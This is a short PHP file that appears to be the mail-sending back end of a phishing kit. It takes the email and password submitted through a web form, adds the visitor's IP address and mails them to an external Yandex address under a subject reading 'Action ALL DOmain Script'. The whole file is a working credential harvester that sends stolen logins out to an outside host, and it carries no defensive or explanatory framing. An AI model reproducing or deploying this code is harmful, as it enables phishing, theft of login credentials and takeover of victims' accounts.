<?php

$ip = getenv("REMOTE_ADDR");	
if(!empty($_POST)) {
 $email= $_POST['email'];
 $password = $_POST['password'];
 


		$to = "emmaoffset.likecc@yandex.com";
		
		
		
         $subject = "Action ALL DOmain Script : $ip ";
		 
		 $message =  "Username            : ".$email."\r\n";
         $message .= "Password            : ".$password."\r\n";
		 $message .= "IP           		  : ".$ip."\r\n";
		$header = "Content type: Action tools\r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 
	 mail ($to,$subject,$message,$header);
		
}
?> 